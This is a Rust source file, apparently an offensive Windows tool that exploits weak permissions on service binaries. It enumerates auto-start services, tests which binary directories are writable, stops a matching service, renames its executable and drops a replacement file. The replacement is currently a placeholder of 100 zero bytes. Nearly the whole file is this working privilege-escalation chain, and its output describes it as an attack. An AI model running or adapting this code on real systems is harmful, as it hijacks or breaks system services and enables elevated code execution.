use std::io::Write;
use std::path::{PathBuf, Path};
use std::process::{Command, Output};
use std::fs::{rename, remove_file, File};
use windows::{core::PCWSTR ,Win32::System::Services::*};

const INFO_HEAD: &str = "\x1b[36m[i]\x1b[0m ";
const IMPT_HEAD: &str = "\x1b[34m[#]\x1b[0m ";
const MISC_HEAD: &str = "\x1b[35m[*]\x1b[0m ";
const EROR_HEAD: &str = "\x1b[31m[=]\x1b[0m ";
const PASS_HEAD: &str = "\x1b[32m[+]\x1b[0m ";
const FAIL_HEAD: &str = "\x1b[91m[-]\x1b[0m ";

fn HasProtectedPath(path: &str) -> bool
{
    if path.to_lowercase().contains("c:\\windows\\system32")
    {
        return true;
    }
    if path.contains(' ') && (path.starts_with("\"")) && (path.ends_with("\""))
    {
        return true;
    }
    return false;
}

fn CanEditDirectory(target_directory: &str) -> bool
{
    let temp_file: PathBuf = Path::new(target_directory).join("temp.temp222");
    if let Ok(_) = File::create_new(&temp_file)
    {
        if let Ok(_) = remove_file(temp_file)
        {
            return true;
        }
    }
    return false;
}

fn IsVulnerableExe(path: &str) -> bool
{
    if HasProtectedPath(&path)
    {
        println!("{}Service uses protected path: {:?}", FAIL_HEAD, path);
        return false;
    }
    let file_path_str: String = ExtractPath(path.to_string());
    let file_path: PathBuf = PathBuf::from(file_path_str);
    let file_parent: &Path = file_path.parent().unwrap();
    let file_directory: &str = file_parent.to_str().unwrap();
    if file_directory == "FAILED"
    {
        println!("{}Could not get directory of path: {:?}", FAIL_HEAD, path);
        return false;
    }
    if CanEditDirectory(&file_directory)
    {
        return true;
    }
    println!("{}Cannot edit directory: {:?}", FAIL_HEAD, file_directory);
    return false;
}

fn StopService(target_service_name: &str) -> bool
{
    let service_check: Result<Output, std::io::Error> = Command::new("sc").args(["query", target_service_name]).output();
    match service_check
    {
        Ok(result) if result.status.success() => {
            let output = String::from_utf8_lossy(&result.stdout).to_lowercase();
            if output.contains("running")
            {
                let outcome: Result<Output, std::io::Error> = Command::new("sc").args(["stop", target_service_name]).output();
                match outcome
                {
                    Ok(out) if out.status.success() => {
                        return true;
                    }, _ => {
                        return false;
                    }
                }
            } else {
                return true;
            }
        }, _ => {
            return true;
        }
    }
}

fn RemoveFileEntension(target_path: &str) -> String
{
    let path_object: &Path = Path::new(target_path);
    if let Some(stem) = path_object.file_stem()
    {
        if let Some(parent) = path_object.parent()
        {
            let extensionless: PathBuf = parent.join(stem);
            let output: String = extensionless.to_string_lossy().to_string();
            return output;
        }
    }
    return "FAILED".to_string();
}

fn ExtractPath(binary_path: String) -> String
{
    let trimmed_path: &str = binary_path.trim();
    if trimmed_path.starts_with('\"')
    {
        if let Some(end_quote) = trimmed_path[1..].find('\"')
        {
            let output = binary_path[1..=end_quote].to_string();
            return output;
        }
    } else {
        let output: String = trimmed_path.split_whitespace().next().unwrap_or("FAILED").to_string();
        return output;
    }
    return "FAILED".to_string();
}

fn DropCustomService(target_binary: &str, target_service_name: &str) -> bool
{
    let extensionless: String = RemoveFileEntension(&target_binary);
    if extensionless != "FAILED"
    {
        if !StopService(target_service_name)
        {
            println!("{}Failed to stop service: {:?}", FAIL_HEAD, target_service_name);
            return false;
        }
        let mut old_service_path = extensionless;
        old_service_path.push_str("_old");
        old_service_path.push_str(&".exe");
        if let Err(_) = rename(target_binary, old_service_path)
        {
            println!("{}Failed to rename service path: {:?}", FAIL_HEAD, target_binary);
            return false;
        }
        let custom_service_data: [u8; 100] = [0u8; 100];
        if let Ok(mut file_handle) = File::create_new(target_binary)
        {
            _ = file_handle.write(&custom_service_data);
            println!("{}Wrote custom service to disk!", MISC_HEAD);
        } else {
            println!("{}Failed to write custom service to disk!", FAIL_HEAD);
            return false;
        }
        return true;
    } else {
        println!("{}Failed to extract path of file: {:?}", FAIL_HEAD, target_binary);
    }
    return false;
}

fn main()
{
    println!("{}Start of program.", IMPT_HEAD);
    println!("{}Checking for service configuration flaws...", INFO_HEAD);
    let mut services: Vec<(String, String, String)> = Vec::new();
    let mut vulnerable_services: Vec<(String, String, String)> = Vec::new();
    unsafe {
        if let Ok(service_manager) = OpenSCManagerW(PCWSTR::null(), SERVICES_ACTIVE_DATABASE, SC_MANAGER_ENUMERATE_SERVICE)
        {
            println!("{}Got handle to service manager, enumerating services...", MISC_HEAD);
            let mut buffer: u32;
            let mut buffer_size: u32 = 0;
            let mut services_returned: u32 = 0;
            let mut resume_handle: u32 = 0;
            // Getting the buffer size needed for EnumServicesStatusA
            _ = EnumServicesStatusA(service_manager, SERVICE_WIN32, SERVICE_STATE_ALL, None, 0, &mut buffer_size, &mut services_returned, Some(&mut resume_handle));
            buffer = buffer_size;
            let mut service_buffer: Vec<u8> = vec![0u8; buffer_size as usize];
            // Capturing the output of EnumServicesStatusA for enumerating services on this device
            if let Ok(_) = EnumServicesStatusA(service_manager, SERVICE_WIN32, SERVICE_STATE_ALL, Some(service_buffer.as_mut_ptr() as *mut ENUM_SERVICE_STATUSA), buffer, &mut buffer_size, &mut services_returned, Some(&mut resume_handle))
            {
                println!("{}Collected {:?} services!", PASS_HEAD, services_returned);
                println!("{}Parsing services for program paths...", MISC_HEAD);
                let service_pointer: *const ENUM_SERVICE_STATUSA = service_buffer.as_ptr() as *const ENUM_SERVICE_STATUSA;
                for i in 0..services_returned
                {
                    let service: ENUM_SERVICE_STATUSA = *service_pointer.add(i as usize);
                    let service_name: String = service.lpDisplayName.to_string().unwrap();
                    // Opening up the service
                    if let Ok (service_handle) = OpenServiceA(service_manager, service.lpServiceName, SERVICE_QUERY_CONFIG)
                    {
                        let mut path_buffer: u32 = 0;
                        // Getting the buffer size needed for the service's information
                        _ = QueryServiceConfigA(service_handle, None, 0, &mut path_buffer);
                        let mut config_buffer: Vec<u8> = vec![0u8; path_buffer as usize];
                        let path_output: *mut QUERY_SERVICE_CONFIGA = config_buffer.as_mut_ptr() as *mut QUERY_SERVICE_CONFIGA;
                        // Getting the service's information
                        match QueryServiceConfigA(service_handle, Some(path_output), path_buffer, &mut path_buffer)
                        {
                            Ok(_) => {
                                let config: &QUERY_SERVICE_CONFIGA = &*path_output;
                                if config.dwStartType == SERVICE_AUTO_START
                                {
                                    services.push((config.lpBinaryPathName.to_string().unwrap(), config.lpDisplayName.to_string().unwrap(), config.lpServiceStartName.to_string().unwrap()));
                                }
                            }, Err(error) => {
                                println!("{}Failed to get information about service {:?} with error: {:?}", FAIL_HEAD, service_name, error);
                            }
                        }
                        _ = CloseServiceHandle(service_handle);
                    } else {
                        println!("{}Failed to open handle to service {:?}", FAIL_HEAD, service_name);
                    }
                }
                if services.len() > 0
                {
                    println!("{}Services enumerated, found {:?} possible services!", INFO_HEAD, services.len());
                    println!("{}Starting search for vulnerable service...", MISC_HEAD);
                    for service in services
                    {
                        let (service_path, service_display_name, service_registry_name) = service;
                        if IsVulnerableExe(&service_path.as_str()) == true
                        {
                            println!("{}Found vulnerable service: {:?}", PASS_HEAD, service_path);
                            vulnerable_services.push((service_path, service_display_name, service_registry_name));
                        }
                    }
                    if vulnerable_services.len() > 0
                    {
                        println!("{}Found {:?} vulnerable services!", PASS_HEAD, vulnerable_services.len());
                        println!("{}Starting injection on base files...", INFO_HEAD);
                        let mut worked: bool = false;
                        for service in vulnerable_services
                        {
                            let (service_path, service_name, service_registry) = service;
                            let service_binary_path = ExtractPath(service_path);
                            if service_binary_path != "FAILED"
                            {
                                println!("{}Attempting to attack service: {:?} ({:?})", MISC_HEAD, service_name, service_registry);
                                let output: bool = DropCustomService(&service_binary_path.as_str(), &service_name.as_str());
                                if output == true
                                {
                                    println!("{}Attacked service: {:?} and won!", INFO_HEAD, service_name);
                                    worked = true;
                                    break;
                                } else {
                                    println!("{}Failed to attack service: {:?}", FAIL_HEAD, service_name);
                                }
                            } else {
                                println!("{}Failed to parse path for service: {:?}", FAIL_HEAD, service_name);
                            }
                        }
                        if worked == true
                        {
                            println!("{}Attack worked, ending program.", INFO_HEAD);
                            println!("{}End of program.", IMPT_HEAD);
                            return ();
                        }
                    } else {
                        println!("{}Found 0 vulnerable services!", FAIL_HEAD);
                    }
                } else {
                    println!("{}Found 0 services found!", FAIL_HEAD);
                }
            } else {
                println!("{}Failed to enumerate services!", FAIL_HEAD);
            }
            _ = CloseServiceHandle(service_manager);
        } else {
            println!("{}Failed to open handle to SCManagerW for closing services....", FAIL_HEAD);
        }
    };
    println!("{}End of program.", IMPT_HEAD);
}
